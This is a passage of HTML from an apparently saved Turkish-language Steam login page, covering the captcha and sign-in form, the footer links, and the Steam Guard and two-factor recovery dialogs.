                  <img style="float: left;" id="captchaImg" src="https://steamstore-a.akamaihd.net/public/images/blank.gif" border="0" width="206" height="40">
                  <div id="captchaRefresh">
                    <span class="linkspan" id="captchaRefreshLink">Yenile</span>
                  </div>
                  <div style="clear: left;"></div>
                </div>
                <br>
                <div class="input_title">Üstteki karakterleri girin</div>
                <input class="text_input" id="input_captcha" type="text" name="captcha_text">
              </div>
              <div style="display: none;"><input type="submit"></div>
            <noscript><p>Javascript, bu sitenin kullanılabilmesi için mutlaka etkin olmalıdır</p></noscript>
            <script>
              document.getElementById('login_form').style.display = 'block';
            </script>
          </div>

          <div class="btn_ctn">
            <div id="login_btn_signin">
              <button type="submit" class="btnv6_blue_hoverfade  btn_medium">
                <span>Oturum Açın</span>
              </button>


            </form>
            </div>
            <div id="login_btn_wait" style="display: none;">
              <img src="https://steamstore-a.akamaihd.net/public/images/login/throbber.gif">
            </div>
          </div>
        </div>
        <div class="loginbox_sep">
        </div>
        <div class="loginbox_right">
          <div class="loginbox_content">
            <h2>Oluşturun</h2>
            <p>Yeni bir ücretsiz hesap</p>
            <br>
            <p>
              Kullanımı kolay ve katılım ücretsizdir. Hemen, bu PC ve Mac oyuncuları için geliştirilmiş lider dijital çözüm olan Steam'de bir hesap açın ve Steam uygulamasını bilgisayarınıza indirin.           </p>
            <div class="nonresponsive_hidden">
              <br>
              <p>
                <a target="_top" href="https://store.steampowered.com/about">Steam hakkında daha fazlasını öğrenin.</a>
              </p>
            </div>
          </div>

          <a target="_top" href="https://store.steampowered.com/join/?redir=%3Fl%3Dturkish&amp;snr=1_60_4__62" class="btnv6_blue_hoverfade btn_medium">
            <span>Steam'e Katılın</span>
          </a>
        </div>
      </div>
    </div>
    <br>

    
    <a target="_top" href="https://help.steampowered.com/tr/wizard/HelpWithLogin?redir=store%2Flogin%2F%3Fredir%3D%253Fl%253Dturkish%26redir_ssl%3D1" id="link_forgot_password">
      Parolanızı mı unuttunuz?    </a>
    <br><br>

  </div>
  <!-- End Center Column -->

      <!-- Right Column -->
    <div class="rightcol">
      <div class="block">

        <div class="block_content block_content_inner login">
          <h2>NEDEN STEAM'E KATILMALIYIM?</h2>
          <ul id="why_list">
            <li>Tam sürüm perakende oyunları satın alıp indirin</li>
            <li>Steam Topluluğu'na katılın</li>
            <li>Oyundayken arkadaşlarınızla sohbet edin</li>
            <li>Oyunlarınızı desteklenen her platformda oynayın</li>
            <li>Oyun, turnuva veya yerel ağ etkinliği düzenleyin</li>
            <li>Otomatik oyun güncellemeleri ve daha fazlası!</li>
          </ul>
          <br>
          <img src="https://steamstore-a.akamaihd.net/public/images/v6/why_join_preview.png" width="265" height="176" border="0">
          <br><br>
        </div>
        <div class="responsive_hidden">
          <br>
          <a target="_top" href="https://store.steampowered.com/about">Steam hakkında daha fazlasını öğrenin.</a>
        </div>
      </div>
    </div>
    <!-- End Right Column -->
  
  <div style="clear: both;"></div>

</div>
<!-- End Main Background -->

    </div>  <!-- responsive_page_legacy_content -->

    <div id="footer_spacer" class=""></div>
<div id="footer" class="">
<div class="footer_content">
  <div class="rule"></div>

  <div id="footer_nav">

    
    
      <span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_steam_pulldown">
        <span>STEAM HAKKINDA</span>
      </span>
    <div class="popup_block_new" id="footer_steam_dropdown" style="display: none;">
            <div class="popup_body popup_menu">
        <a class="popup_menu_item" href="https://store.steampowered.com/about/?snr=1_44_44__22">
          Steam Nedir?        </a>
        <!--
          <a class="popup_menu_item" href="">
            Hemen Steam İndirin         </a>
          -->
        <a class="popup_menu_item" href="https://support.steampowered.com/kb_article.php?p_faqid=549#gifts" target="_blank" rel="noreferrer">
          Steam Üzerinden Hediyeleşme       </a>
        <a class="popup_menu_item" href="https://steamcommunity.com/?snr=1_44_44__22">
          Steam Topluluğu       </a>
      </div>
          </div>
  
      <span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_valve_pulldown">
        <span>VALVE HAKKINDA</span>
      </span>
    <div class="popup_block_new" id="footer_valve_dropdown" style="display: none;">
      <div class="popup_body popup_menu">
        <a class="popup_menu_item" href="http://www.valvesoftware.com/about.html" target="_blank" rel="noreferrer">
          Valve Hakkında        </a>
        <a class="popup_menu_item" href="http://www.valvesoftware.com/business/" target="_blank" rel="noreferrer">
          İş Çözümleri        </a>
        <a class="popup_menu_item" href="http://www.steampowered.com/steamworks/" target="_blank" rel="noreferrer">
          Steamworks        </a>
        <a class="popup_menu_item" href="http://www.valvesoftware.com/jobs.html" target="_blank" rel="noreferrer">
          Kariyer       </a>
      </div>
    </div>
      
      
      <span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_help_pulldown">
        <span>YARDIM</span>
      </span>
    <div class="popup_block_new" id="footer_help_dropdown" style="display: none;">
            <div class="popup_body popup_menu">
        <a class="popup_menu_item" href="https://help.steampowered.com/tr/?snr=1_44_44__23">
          Destek        </a>
        <a class="popup_menu_item" href="https://store.steampowered.com/forums/?snr=1_44_44__23" target="_blank" rel="noreferrer">
          Forumlar        </a>
        <a class="popup_menu_item" href="https://store.steampowered.com/stats/?snr=1_44_44__23" target="_blank" rel="noreferrer">
          İstatistikler       </a>
      </div>
          </div>

      
      <span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_feeds_pulldown">
        <span>HABER AKIŞLARI</span>
      </span>
    <div class="popup_block_new" id="footer_feeds_dropdown" style="display: none;">
      <div class="popup_body popup_menu">
        <a class="popup_menu_item" href="https://store.steampowered.com/feeds/news.xml">
          <img src="https://steamstore-a.akamaihd.net/public/images/ico/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">&nbsp;&nbsp;Steam Haberleri        </a>
        <a class="popup_menu_item" href="https://store.steampowered.com/feeds/newreleases.xml">
          <img src="https://steamstore-a.akamaihd.net/public/images/ico/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">&nbsp;&nbsp;Yeni Çıkan Oyunlar       </a>
        <a class="popup_menu_item" href="https://store.steampowered.com/feeds/daily_deals.xml">
          <img src="https://steamstore-a.akamaihd.net/public/images/ico/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">&nbsp;&nbsp;Günlük Fırsatlar       </a>
      </div>
    </div>
    <div style="clear: left;"></div>

    <script type="text/javascript">
      RegisterFlyout( 'footer_genre_pulldown', 'footer_genre_dropdown', null, null, true );
      RegisterFlyout( 'footer_steam_pulldown', 'footer_steam_dropdown', null, null, true );
      RegisterFlyout( 'footer_valve_pulldown', 'footer_valve_dropdown', null, null, true );
      RegisterFlyout( 'footer_help_pulldown', 'footer_help_dropdown', null, null, true );
      RegisterFlyout( 'footer_feeds_pulldown', 'footer_feeds_dropdown', null, null, true );
    </script>
  </div>

  <br>

    <div class="rule"></div>
        <div id="footer_logo_steam"><img src="https://steamstore-a.akamaihd.net/public/images/v6/logo_steam_footer.png" alt="Valve Software" border="0"></div>
  
    <div id="footer_logo"><a href="http://www.valvesoftware.com" target="_blank" rel="noreferrer"><img src="https://steamstore-a.akamaihd.net/public/images/v6/logo_valve_footer.png" alt="Valve Software" border="0"></a></div>
    <div id="footer_text">
        <div>© 2019 Valve Corporation. Tüm hakları saklıdır. Tüm ticari markalar, ABD ve diğer ülkelerde ilgili sahiplerinin mülkiyetindedir.</div>
        <div>Uygulanabilir yerlerde fiyatlara KDV dahildir.&nbsp;&nbsp;

            <a href="https://store.steampowered.com/privacy_agreement/" target="_blank" rel="noreferrer">Gizlilik Politikası</a>
            &nbsp; | &nbsp;
            <a href="https://store.steampowered.com/legal/" target="_blank" rel="noreferrer">Yasal Bilgi</a>
            &nbsp; | &nbsp;
            <a href="https://store.steampowered.com/subscriber_agreement/" target="_blank" rel="noreferrer">Steam Abonelik Sözleşmesi</a>
            &nbsp; | &nbsp;
            <a href="https://store.steampowered.com/steam_refunds/" target="_blank" rel="noreferrer">İadeler</a>

        </div>
          <div class="responsive_optin_link">
        <div class="btn_medium btnv6_grey_black" onclick="Responsive_RequestMobileView()">
          <span>Mobil internet sitesini görüntüle</span>
        </div>
      </div>
    
    </div>



    <div style="clear: left;"></div>
  <br>

    <div class="rule"></div>

    <div class="valve_links">
        <a href="http://www.valvesoftware.com/about.html" target="_blank" rel="noreferrer">Valve Hakkında</a>
        &nbsp; | &nbsp;<a href="http://www.steampowered.com/steamworks/" target="_blank" rel="noreferrer">Steamworks</a>
        &nbsp; | &nbsp;<a href="http://www.valvesoftware.com/jobs.html" target="_blank" rel="noreferrer">Kariyer</a>
        &nbsp; | &nbsp;<a href="https://partner.steamgames.com/steamdirect" target="_blank" rel="noreferrer">Steam Dağıtımı</a>
    &nbsp; | &nbsp;<a href="https://store.steampowered.com/digitalgiftcards/" target="_blank" rel="noreferrer">Hediye Kartları</a>
    &nbsp; | &nbsp;<a href="https://steamcommunity.com/linkfilter/?url=http://www.facebook.com/Steam" target="_blank" rel="noopener"><img src="https://steamstore-a.akamaihd.net/public/images/ico/ico_facebook.gif"> Steam</a>
    &nbsp; | &nbsp;<a href="http://twitter.com/steam_games" target="_blank" rel="noreferrer"><img src="https://steamstore-a.akamaihd.net/public/images/ico/ico_twitter.gif"> @steam_games</a>
    </div>

</div>
</div>
  </div>  <!-- responsive_page_content -->

</div>  <!-- responsive_page_frame -->

<div id="loginModals">
  <div class="login_modal loginAuthCodeModal" style="display: none">
    <form data-ajax="false">
      <div class="auth_message_area">
        <div id="auth_icon" class="auth_icon auth_icon_key">
        </div>
        <div class="auth_messages" id="auth_messages">
          <div class="auth_message" id="auth_message_entercode" style="display: none;">
            <div class="auth_modal_h1">Merhaba!</div>
            <p>Görüyoruz ki Steam'e yeni bir tarayıcıdan veya yeni bir bilgisayardan giriş yapıyorsunuz. Belki de bir süredir öyleydi...</p>
          </div>
          <div class="auth_message" id="auth_message_checkspam" style="display: none;">
            <div class="auth_modal_h1">Gereksiz e-postalara mı karıştı?</div>
            <p>Gereksiz e-postalar klasörünüzü kontrol ettiniz mi? Eğer gelen kutunuzda Steam Destek'ten yeni bir mesaj göremiyorsanız, oraya bakmayı deneyin.</p>
          </div>
          <div class="auth_message" id="auth_message_success" style="display: none;">
            <div class="auth_modal_h1">Tebrikler!</div>
            <p>Artık buradan Steam hesabınıza ulaşabilirsiniz.</p>
          </div>
          <div class="auth_message" id="auth_message_incorrectcode" style="display: none;">
            <div class="auth_modal_h1">Hay aksi!</div>
            <p>Üzgünüz fakat, <br>bu hiç de doğru bir şey değil...</p>
          </div>
          <div class="auth_message" id="auth_message_help" style="display: none;">
            <div class="auth_modal_h1">Yardım etmemize izin verin!</div>
            <p>Sorun yaşadığınız için üzgünüz. Steam hesabınızın sizin için değerli olduğunu biliyoruz ve ona erişim sağlamanıza yardımcı olmak görevimizdir.</p>
          </div>
        </div>
      </div>
      <div id="auth_details_messages" class="auth_details_messages">
        <div class="auth_details" id="auth_details_entercode" style="display: none;">
          Güvenlik önlemi nedeniyle bu tarayıcıya erişim hakkı sağlamak için <span id="emailauth_entercode_emaildomain"></span> adresine yollamış olduğumuz özel kodu girmeniz gerekmektedir.       </div>
        <div class="auth_details" id="auth_details_success" style="display: none;">
          Eğer bu ortak kullanılan bir bilgisayar ise, tarayıcı oturumundan ayrılmaya hazır olduğunuzda Steam'den çıkış yaptığınızdan emin olun.        </div>
        <div class="auth_details" id="auth_details_help" style="display: none;">
          Bir elemanımızın size yardımcı olması için lütfen Steam Destek ile iletişime geçin. Hesap erişimi yardımı için mantıklı talepler bir numaralı önceliğimizdir.       </div>
      </div>
      <div class="authcode_entry_area">
        <div id="authcode_entry">
          <div class="authcode_entry_box">
            <input class="authcode_entry_input authcode_placeholder" id="authcode" type="text" value="" placeholder="kodunuzu buraya girin">

          </div>
        </div>
        <div id="authcode_help_supportlink">
          <a href="https://support.steampowered.com/kb_article.php?ref=4020-ALZM-5519" data-ajax="false" data-externallink="1">Hesap erişimi yardımı için Steam Destek ile iletişime geçin</a>
        </div>
      </div>
      <div class="modal_buttons" id="auth_buttonsets">
        <div class="auth_buttonset" id="auth_buttonset_entercode" style="display: none;">
          <div data-modalstate="submit" class="auth_button leftbtn">
            <div class="auth_button_h3">Gönder</div>
            <div class="auth_button_h5">özel erişim kodum</div>
          </div>
          <div data-modalstate="checkspam" class="auth_button">
            <div class="auth_button_h3">Ne mesajı?</div>
            <div class="auth_button_h5">Steam Destek'ten herhangi bir mesaj gelmedi...</div>
          </div>
          <div style="clear: left;"></div>
        </div>
        <div class="auth_buttonset" id="auth_buttonset_checkspam" style="display: none;">
          <div data-modalstate="submit" class="auth_button leftbtn">
            <div class="auth_button_h3">Buldum!</div>
            <div class="auth_button_h5">ve özel erişim kodumu yukarıya girdim.</div>
          </div>
          <div data-modalstate="help" class="auth_button">
            <div class="auth_button_h3">Hâlâ e-posta gelmedi...</div>
            <div class="auth_button_h5">Steam Destek'ten herhangi bir mesaj gelmedi...</div>
          </div>
          <div style="clear: left;"></div>
        </div>
        <div class="auth_buttonset" id="auth_buttonset_success" style="display: none;">
          <div class="auth_button auth_button_spacer">
          </div>
          <a data-modalstate="complete" class="auth_button" id="success_continue_btn" href="javascript:void(0);">
            <div class="auth_button_h3">Steam'e geçin!</div>
            <div class="auth_button_h5">&nbsp;<br>&nbsp;</div>
          </a>
          <div style="clear: left;"></div>
        </div>
        <div class="auth_buttonset" id="auth_buttonset_incorrectcode" style="display: none;">
          <div data-modalstate="submit" class="auth_button leftbtn">
            <div class="auth_button_h3">Tekrar denemek istiyorum</div>
            <div class="auth_button_h5">ve özel erişim kodumu yukarıya tekrar girdim</div>
          </div>
          <div data-modalstate="help" class="auth_button">
            <div class="auth_button_h3">Lütfen yardım edin</div>
            <div class="auth_button_h5">Sanırım Steam Destek'in yardımına ihtiyacım var...</div>
          </div>
          <div style="clear: left;"></div>
        </div>
        <div class="auth_buttonset" id="auth_buttonset_waiting" style="display: none;">
        </div>
      </div>
      <div style="" id="auth_details_computer_name" class="auth_details_messages">
        Bu internet tarayıcısını Steam Guard cihazları listesinde kolayca ayırt edebilmek için en az 6 karakter uzunluğunda tanıdık bir isim veriniz.       <div id="friendly_name_box" class="friendly_name_box">
          <input class="authcode_entry_input authcode_placeholder" id="friendlyname" type="text" placeholder="buraya tanıdık bir isim girin">
        </div>
      </div>
      <div style="display: none;">
        <input type="submit">
      </div>
    </form>



  </div>

  <div class="login_modal loginIPTModal" style="display: none">
    <div class="auth_message_area">
      <div class="auth_icon ipt_icon">
      </div>
      <div class="auth_messages">
        <div class="auth_message">
          <div class="auth_modal_h1">Affedersiniz</div>
          <p>Bu hesaba ek izin olmadan bu bilgisayardan erişilemez.</p>
        </div>
      </div>
    </div>
    <div class="auth_details_messages">
      <div class="auth_details">
        Bir elemanımızın size yardımcı olması için lütfen Steam Destek ile iletişime geçin. Hesap erişimi yardımı için mantıklı talepler bir numaralı önceliğimizdir.     </div>
    </div>
    <div class="authcode_entry_area">
    </div>
    <div class="modal_buttons">
      <div class="auth_buttonset">
        <a href="https://support.steampowered.com/kb_article.php?ref=9400-IPAX-9398&amp;auth=e39b5c227cffc8ae65414aba013e5fef" class="auth_button leftbtn" data-ajax="false" data-externallink="1">
          <div class="auth_button_h3">Daha fazlasını öğrenin</div>
          <div class="auth_button_h5">Intel® Kimlik Koruma Teknolojisi hakkında</div>
        </a>
        <a href="https://support.steampowered.com" class="auth_button" data-ajax="false" data-externallink="1">
          <div class="auth_button_h3">Lütfen yardım edin</div>
          <div class="auth_button_h5">Sanırım Steam Destek'in yardımına ihtiyacım var...</div>
        </a>
        <div style="clear: left;"></div>
      </div>
    </div>
  </div>



  <div class="login_modal loginTwoFactorCodeModal" style="display: none;">


    <form>
    <div class="twofactorauth_message_area">
      <div id="login_twofactorauth_icon" class="auth_icon auth_icon_key">
      </div>
      <div class="twofactorauth_messages" id="login_twofactorauth_messages">
        <div class="twofactorauth_message" id="login_twofactorauth_message_entercode" style="display: none;">
          <div class="auth_modal_h1">Merhaba <span id="login_twofactorauth_message_entercode_accountname"></span>!</div>
          <p>Bu hesapta Steam Guard Mobil Kimlik Doğrulayıcı kullanılmaktadır.</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_incorrectcode" style="display: none;">
          <div class="auth_modal_h1">Hay aksi!</div>
          <p>Üzgünüz fakat, <br>bu doğru görünmüyor...</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp" style="display: none;">
          <div class="auth_modal_h1">Yardım etmemize izin verin!</div>
          <p>Sorun yaşadığınız için üzgünüz. Steam hesabınızın sizin için değerli olduğunu biliyoruz ve ona erişim sağlamanıza yardımcı olmak görevimizdir.</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove" style="display: none;">
          <div class="auth_modal_h1">Hesabınızın sahibiyetini onaylayın</div>
          <p><span id="login_twofactorauth_selfhelp_sms_remove_last_digits"></span> ile biten telefon numaranıza bir hesap kurtarma kodu içeren bir kısa mesaj gönderdik. Kodu girdikten sonra, mobil kimlik doğrulayıcıyı hesabınızdan kaldıracağız ve Steam Guard kodlarını e-posta ile edinebileceksiniz.</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove_entercode" style="display: none;">
          <div class="auth_modal_h1">Hesabınızın sahibiyetini onaylayın</div>
          <p><span id="login_twofactorauth_selfhelp_sms_remove_entercode_last_digits"></span> ile biten telefon numaranıza onaylama kodu içeren bir kısa mesaj gönderdik. Mobil kimlik doğrulayıcıyı hesabınızdan kaldırabilmemiz için kodu aşağıya girin.</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove_incorrectcode" style="display: none;">
          <div class="auth_modal_h1">Hay aksi!</div>
          <p>Üzgünüz fakat, <br>bu doğru görünmüyor...</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_twofactor_removed" style="display: none;">
          <div class="auth_modal_h1">Tebrikler!</div>
          <p>Mobil kimlik doğrulayıcıyı hesabınızdan kaldırdık. Bir sonraki girişinizde, e-posta adresinize gönderilen bir Steam Guard kodu girmelisiniz.</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_twofactor_replaced" style="display: none;">
          <div class="auth_modal_h1">Tebrikler!</div>
          <p>Hesabınız için mobil kimlik doğrulayıcı kodlarını edinmek için artık bu aygıtı kullanabilirsiniz. Önceden kimlik doğrulayıcı kodları sağlayan başka bir aygıt artık devre dışıdır.</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_nosms" style="display: none;">
          <div class="auth_modal_h1">Kurtarma kodunuz var mı?</div>
          <p>Steam hesabınız ile ilişkilendirilmiş bir telefon numarasına sahip değilsiniz, bu yüzden hesap sahibiyetinizi kısa mesaj ile doğrulayamıyoruz. Mobil kimlik doğrulayıcıyı eklediğinizde yazdığınız kurtarma koduna sahip misiniz? Kurtarma kodu 'R' harfi ile başlar.</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode" style="display: none;">
          <div class="auth_modal_h1">Kurtarma kodunuzu girin</div>
          <p>Lütfen kurtarma kodunu aşağıdaki kutuya giriniz. Kurtarma kodu 'R' harfi ile başlar.</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_incorrectcode" style="display: none;">
          <div class="auth_modal_h1">Hay aksi!</div>
          <p>Üzgünüz fakat, <br>bu doğru görünmüyor...</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_incorrectcode_exhausted" style="display: none;">
          <div class="auth_modal_h1">Hay aksi!</div>
          <p>Üzgünüz fakat, <br>bu doğru görünmüyor...</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_message" style="display: none;">
          <div class="auth_modal_h1">Hay aksi!</div>
          <p>Üzgünüz fakat, <br>bu doğru görünmüyor...</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_couldnthelp" style="display: none;">
          <div class="auth_modal_h1">Yardım etmemize izin verin!</div>
          <p>Mobil aygıtınıza veya hesabınız ile ilişkilendirilmiş telefon numarasına erişimi kaybettiyseniz ve mobil kimlik doğrulayıcıyı eklediğinizde yazdığınız kurtarma koduna sahip değilseniz, lütfen hesabınıza erişimi kurtarmak için Steam Destek ile iletişime geçin.</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_help" style="display: none;">
          <div class="auth_modal_h1">Yardım etmemize izin verin!</div>
          <p>Sorun yaşadığınız için üzgünüz. Steam hesabınızın sizin için değerli olduğunu biliyoruz ve ona erişim sağlamanıza yardımcı olmak görevimizdir.</p>
        </div>
        <div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_failure" style="display: none;">
          <div class="auth_modal_h1">Üzgünüz!</div>
          <p>Talebiniz işleme alınırken bir hata meydana geldi.</p>
        </div>
      </div>
    </div>
    <div id="login_twofactorauth_details_messages" class="twofactorauth_details_messages">
      <div class="twofactorauth_details" id="login_twofactorauth_details_entercode" style="display: none;">
        Mobil Steam uygulamasında görüntülenen kodu giriniz:      </div>
      <div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp" style="display: none;">
        Eğer mobil aygıtınızı kaybetmiş ya da Steam uygulamasını kaldırmış iseniz, bu durumda mobil kimlik doğrulayıcıyı devre dışı bırakabilirsiniz. Bu işlem, hesap güvenliğinizi azaltacaktır. Dolayısıyla daha sonra mobil kimlik doğrulamayı yeni bir mobil aygıta eklemelisiniz.      </div>
      <div class="twofactorauth_details" id="login_twofactorauth_details_help" style="display: none;">
        Bir elemanımızın size yardımcı olması için lütfen Steam Destek ile iletişime geçin.     </div>
      <div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_failure" style="display: none;">
      </div>
      <div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_rcode_incorrectcode" style="display: none;">
      </div>
      <div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_rcode_incorrectcode_exhausted" style="display: none;">
      </div>
    </div>
    <div class="twofactorauthcode_entry_area">
      <div id="login_twofactor_authcode_entry">
        <div class="twofactorauthcode_entry_box">
          <input class="twofactorauthcode_entry_input authcode_placeholder" id="twofactorcode_entry" type="text" placeholder="kodunuzu buraya girin" autocomplete="off">
        </div>
      </div>
      <div id="login_twofactor_authcode_help_supportlink">
        <a href="https://support.steampowered.com/kb_article.php?ref=4020-ALZM-5519">
          Hesap erişimi yardımı için Steam Destek ile iletişime geçin       </a>
      </div>
    </div>
    <div class="modal_buttons" id="login_twofactorauth_buttonsets">
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_entercode" style="display: none;">
        <div type="submit" class="auth_button leftbtn" data-modalstate="submit">
          <div class="auth_button_h3">Gönder</div>
          <div class="auth_button_h5">Kimlik doğrulayıcı kodumu</div>
        </div>
        <div class="auth_button" data-modalstate="selfhelp">
          <div class="auth_button_h3">Lütfen yardım edin</div>
          <div class="auth_button_h5">Artık Mobil Kimlik Doğrulayıcı kodlarıma erişimim yok.</div>
        </div>
        <div style="clear: left;"></div>
      </div>
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_incorrectcode" style="display: none;">
        <div class="auth_button leftbtn" data-modalstate="submit">
          <div class="auth_button_h3">Tekrar denemek istiyorum</div>
          <div class="auth_button_h5">ve kimlik doğrulayıcı kodumu yukarıya girdim.</div>
        </div>
        <div class="auth_button" data-modalstate="selfhelp">
          <div class="auth_button_h3">Lütfen yardım edin</div>
          <div class="auth_button_h5">Sanırım Steam Destek'in yardımına ihtiyacım var...</div>
        </div>
        <div style="clear: left;"></div>
      </div>
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp" style="display: none;">
        <div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_start">
          <div class="auth_button_h3" style="font-size: 16px;">Kimlik Doğrulayıcıyı kaldır</div>
          <div class="auth_button_h5">ve kodları e-posta ile almaya geri dönün</div>
        </div>
        <div class="auth_button" data-modalstate="selfhelp_sms_reset_start">
          <div class="auth_button_h3">Bu aygıtı kullan</div>
          <div class="auth_button_h5">ve kimlik doğrulayıcı kodlarını bu uygulama ile alın</div>
        </div>
      </div>
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_sms_remove" style="display: none;">
        <div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_sendcode">
          <div class="auth_button_h3">TAMAM!</div>
          <div class="auth_button_h5">Bana kısa mesajı gönder</div>
        </div>
        <div class="auth_button" data-modalstate="selfhelp_nosms">
          <div class="auth_button_h3">Yapamıyorum</div>
          <div class="auth_button_h5">çünkü telefon numarama artık erişimim yok</div>
        </div>
      </div>
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_sms_remove_entercode" style="display: none;">
        <div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_checkcode">
          <div class="auth_button_h3">Gönder</div>
          <div class="auth_button_h5">Yukarıdaki kodu girdim</div>
        </div>
        <div class="auth_button" data-modalstate="selfhelp_nosms">
          <div class="auth_button_h3">Lütfen yardım edin</div>
          <div class="auth_button_h5">Kısa mesajları alamıyorum</div>
        </div>
      </div>
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_sms_remove_incorrectcode" style="display: none;">
        <div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_checkcode">
          <div class="auth_button_h3">Gönder</div>
          <div class="auth_button_h5">Kodu tekrar girdim. Hadi tekrar deneyelim.</div>
        </div>
        <div class="auth_button" data-modalstate="selfhelp_nosms">
          <div class="auth_button_h3">Lütfen yardım edin</div>
          <div class="auth_button_h5">Kısa mesajları alamıyorum</div>
        </div>
      </div>
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_twofactor_removed" style="display: none;">
        <div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_complete">
          <div class="auth_button_h3">Giriş Yap</div>
          <div class="auth_button_h5">kaldırılmış mobil kimlik doğrulayıcı ile</div>
        </div>
      </div>
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_twofactor_replaced" style="display: none;">
        <div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_complete">
          <div class="auth_button_h3">Giriş Yap</div>
          <div class="auth_button_h5">Steam Mobil uygulamasına</div>
        </div>
      </div>
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_nosms" style="display: none;">
        <div class="auth_button leftbtn" data-modalstate="selfhelp_rcode">
          <div class="auth_button_h3">Evet</div>
          <div class="auth_button_h5">'R' ile başlayan kurtarma koduna sahibim</div>
        </div>
        <div class="auth_button" data-modalstate="selfhelp_couldnthelp">
          <div class="auth_button_h3">Hayır</div>
          <div class="auth_button_h5">Öyle bir koda sahip değilim</div>
        </div>
      </div>
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_rcode" style="display: none;">
        <div class="auth_button leftbtn" data-modalstate="selfhelp_rcode_checkcode">
          <div class="auth_button_h3">Gönder</div>
          <div class="auth_button_h5">kurtarma kodum</div>
        </div>
        <div class="auth_button" data-modalstate="selfhelp_couldnthelp">
          <div class="auth_button_h3">Lütfen yardım edin</div>
          <div class="auth_button_h5">Sanırım Steam Destek'in yardımına ihtiyacım var...</div>
        </div>
      </div>
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_rcode_incorrectcode" style="display: none;">
        <div class="auth_button leftbtn" data-modalstate="selfhelp_rcode_checkcode">
          <div class="auth_button_h3">Gönder</div>
          <div class="auth_button_h5">Kodu tekrar girdim. Hadi tekrar deneyelim.</div>
        </div>
        <div class="auth_button" data-modalstate="selfhelp_couldnthelp">
          <div class="auth_button_h3">Lütfen yardım edin</div>
          <div class="auth_button_h5">Sanırım Steam Destek'in yardımına ihtiyacım var...</div>
        </div>
      </div>
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_rcode_incorrectcode_exhausted" style="display: none;">
        <div class="auth_button" data-modalstate="selfhelp_couldnthelp">
          <div class="auth_button_h3">Lütfen yardım edin</div>
          <div class="auth_button_h5">Sanırım Steam Destek'in yardımına ihtiyacım var...</div>
        </div>
      </div>
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_couldnthelp" style="display: none;">
        <a class="auth_button leftbtn" href="https://help.steampowered.com/">
          <div class="auth_button_h3">Bizimle iletişime geç</div>
          <div class="auth_button_h5">hesap erişimi yardımı için</div>
        </a>
      </div>
      <div class="auth_buttonset" id="login_twofactorauth_buttonset_waiting" style="display: none;">
      </div>
    </div>
    <div style="display: none;">
      <input type="submit">
    </div>
    </form>
  </div>
</div><div class="miniprofile_hover" style="display: none;"><div class="shadow_ul"></div><div class="shadow_top"></div><div class="shadow_ur"></div><div class="shadow_left"></div><div class="shadow_right"></div><div class="shadow_bl"></div><div class="shadow_bottom"></div><div class="shadow_br"></div><div class="miniprofile_hover_inner shadow_content"></div><div class="hover_arrow left miniprofile_arrow"><div class="miniprofile_arrow_inner"></div></div><div class="hover_arrow right miniprofile_arrow"><div class="miniprofile_arrow_inner"></div></div></div></body></html>